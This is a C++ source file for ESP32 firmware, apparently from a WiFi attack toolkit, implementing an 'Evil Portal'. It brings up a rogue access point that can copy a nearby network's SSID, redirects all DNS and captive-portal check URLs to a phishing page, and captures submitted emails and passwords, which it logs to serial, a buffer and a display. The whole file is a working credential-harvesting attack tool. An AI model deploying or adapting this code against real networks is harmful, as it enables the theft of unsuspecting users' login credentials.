#include "EvilPortal.h"

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

#ifdef HAS_PSRAM
  char* index_html = nullptr;
#endif

AsyncWebServer server(80);

// Serializes the captured-credential char buffers between the /get web handler
// (AsyncTCP task) and the main task's main()/accessors.
static portMUX_TYPE cred_mux = portMUX_INITIALIZER_UNLOCKED;

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif
}

void EvilPortal::cleanup() {
  this->ap_index = -1;

  // Do NOT free index_html here: the web handlers that stream it (send_P/send) may
  // still be servicing an in-flight AsyncTCP request when cleanup() runs on the main
  // task -- freeing it mid-stream is a use-after-free. setHtml() reuses (overwrites)
  // the single PSRAM buffer each activation, so keeping it for the app lifetime is safe.
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  char tmp[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  strlcpy(tmp, this->user_name, sizeof(tmp));
  portEXIT_CRITICAL(&cred_mux);
  return String(tmp);
}

String EvilPortal::get_password() {
  char tmp[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  strlcpy(tmp, this->password, sizeof(tmp));
  portEXIT_CRITICAL(&cred_mux);
  return String(tmp);
}

void EvilPortal::setupServer() {
  #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
      Serial.println(F("client connected"));
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send(200, "text/html", index_html);
      Serial.println("client connected");
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #endif

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    #ifndef HAS_PSRAM
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
      });
    #else
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send(200, "text/html", index_html);
      });
    #endif
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    // Copy into the fixed cred buffers under the spinlock so the main task never reads
    // them mid-write. Runs on the AsyncTCP task.
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      portENTER_CRITICAL(&cred_mux);
      strlcpy(this->user_name, inputMessage.c_str(), MAX_CRED_SIZE);
      this->name_received = true;
      portEXIT_CRITICAL(&cred_mux);
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      portENTER_CRITICAL(&cred_mux);
      strlcpy(this->password, inputMessage.c_str(), MAX_CRED_SIZE);
      this->password_received = true;
      portEXIT_CRITICAL(&cred_mux);
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println(F("Setting HTML from serial..."));
  const char *htmlStr = Serial.readString().c_str();
  #ifdef HAS_PSRAM
    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
  #endif
  strlcpy(index_html, htmlStr, strlen(htmlStr));
  #ifdef HAS_PSRAM
    index_html[MAX_HTML_SIZE - 1] = '\0';
  #endif
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println(F("html previously set"));
    return true;
  }
  Serial.println(F("Setting HTML..."));
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      Serial.println("The provided HTML is too large.\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    #ifdef HAS_PSRAM
      index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
    #ifdef HAS_PSRAM
      index_html[MAX_HTML_SIZE - 1] = '\0';
    #endif
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Could not find /ap.config.txt."));
        this->sendToDisplay(F("Touch to exit..."));
      #endif
      Serial.println(F("Could not find /ap.config.txt. Use stopscan..."));
      return false;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
        #endif
        Serial.println("The provided AP name is too large.\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from config file"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The provided AP name is too large.\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The given AP name is too large.\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println(F("ap config set"));
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
  this->has_ap = true;
  Serial.println(F("ap config set"));
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  Serial.print(F("ap ip address: "));
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
  Serial.println(F("Evil Portal READY"));
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  // Snapshot the cred buffers + clear the flags under the spinlock (short critical
  // section), then format/print/save OUTSIDE the lock.
  bool ready = false;
  char u[MAX_CRED_SIZE], p[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  if (this->name_received && this->password_received) {
    strlcpy(u, this->user_name, sizeof(u));
    strlcpy(p, this->password, sizeof(p));
    this->name_received = false;
    this->password_received = false;
    ready = true;
  }
  portEXIT_CRITICAL(&cred_mux);

  if (ready) {
    char line[2 * MAX_CRED_SIZE + 16];
    snprintf(line, sizeof(line), "u: %s p: %s\n", u, p);

    Serial.print(line);
    buffer_obj.append(line);
    #ifdef HAS_SCREEN
        this->sendToDisplay(line);
    #endif
  }
}
